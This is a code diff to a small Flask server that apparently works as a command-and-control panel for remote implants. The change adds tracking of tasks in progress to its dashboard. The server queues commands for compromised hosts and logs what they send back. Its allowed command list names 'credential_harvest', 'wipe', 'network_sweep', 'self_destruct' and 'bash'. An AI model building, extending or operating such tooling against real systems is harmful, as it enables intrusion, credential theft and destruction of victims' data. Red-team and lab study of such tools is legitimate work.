@@ -7,6 +7,7 @@ app = Flask(__name__)
 # --- STATE --- #
 commandQ = []
 tasks = {}
+inProgress = {}
 results = []
 allowedCommands = ["whoami", "hostname", "pwd", "shutdown", "wipe", "bash", "read", "write", "execute", "full_chain", "network_sweep", "credential_harvest", "self_destruct"]
 
@@ -28,6 +29,13 @@ def home():
         html += "<ul>" + "".join(f"<li>{cmd}</li>" for cmd in commandQ) + "</ul>"
     else:
         html += "<p><i>Empty</i></p>"
+
+    # Tasks In Progress
+    html += "<h2>Tasks In Progress</h2>"
+    if inProgress:
+        html += "<ul>" + "".join(f"<li>{cmd} <small>(ID: {tid})</small></li>" for tid, cmd in inProgress.items()) + "</ul>"
+    else:
+        html += "<p><i>None</i></p>"
         
     # Results Log
     html += "<h2>Execution Results</h2>"
@@ -54,6 +62,7 @@ def command():
     cmd = commandQ.pop(0)
     taskID = str(uuid.uuid4())[:8]
     tasks[taskID] = cmd
+    inProgress[taskID] = cmd
     print(f'[+] Issuing task {taskID}: {cmd}')
     return jsonify({"taskID": taskID, "command": cmd})
 
@@ -88,6 +97,9 @@ def result():
     cmd = tasks.get(taskID, "initial_recon_or_unknown")
     print(f"[+] Result received for {taskID} {cmd}: {output}")
     
+    if taskID in inProgress:
+        del inProgress[taskID]
+        
     results.append({"taskID": taskID, "cmd": cmd, "output": output})
     return jsonify({"status": "received"})
 
